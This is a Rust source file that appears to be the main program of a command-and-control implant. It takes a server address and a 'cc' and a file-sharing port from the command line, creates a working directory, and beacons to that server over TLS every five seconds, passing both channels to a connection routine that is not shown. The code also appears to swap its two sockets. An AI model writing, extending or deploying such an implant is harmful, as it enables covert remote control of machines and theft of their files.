
mod ssl_builder;
mod connection;
mod make_dir;

use std::net::{TcpStream,SocketAddr, Ipv4Addr, IpAddr};
use std::process::Command;
use std::process::exit;
use std::env::args;


fn main() {

    let args: Vec<String> = args().collect();
    let items: u8 = args.len().try_into().unwrap();

    let ip_addr_1: u8 = args[1].parse().expect("Args must be a valid u8");
    let ip_addr_2: u8 = args[2].parse().expect("Args must be a valid u8");
    let ip_addr_3: u8 = args[3].parse().expect("Args must be a valid u8");
    let ip_addr_4: u8 = args[4].parse().expect("Args must be a valid u8");
    let fs_port: u16 = args[5].parse().expect("Args must be a valid u16");
    let cc_port: u16 = args[6].parse().expect("Args must be a valid u16");

    let ip_addr = IpAddr::V4(Ipv4Addr::new(ip_addr_1,ip_addr_2, ip_addr_3, ip_addr_4));
    let fs_sock_addr = SocketAddr::new(ip_addr,fs_port);
    let cc_sock_addr = SocketAddr::new(ip_addr,cc_port);



    let code = make_dir::make_dir();
    match code {
        0 => {},
        other =>{
            println!("Error, couldn't make the nessessary directory.");
            println!("The proram should be quit here.");
            exit(other);
        },
    };

    let mut number_of_order: u64 = 0;
    loop {
    
        let connector = ssl_builder::ssl_builder();


        if let Ok(stream_cc) = TcpStream::connect(fs_sock_addr) {
            if let Ok(stream_fs) = TcpStream::connect(cc_sock_addr) {
                let stream_cc = connector.connect(ip_addr.to_string().as_str(),stream_cc).unwrap();
                let stream_fs = connector.connect(ip_addr.to_string().as_str(),stream_fs).unwrap();
                connection::flow(stream_cc, stream_fs, number_of_order);

                number_of_order += 1;
            } else {
                println!("Counldn't connect to the file_sharing socket. Is the server is up ?")
            }
        } else {
            println!("Couldn't connect to the cc socket. Is the server is up ?");
        }

        let _ = Command::new("sleep")
            .args(["5"]).output();
    }

}





// Reference https://doc.rust-lang.org/std/net/struct.TcpStream.html
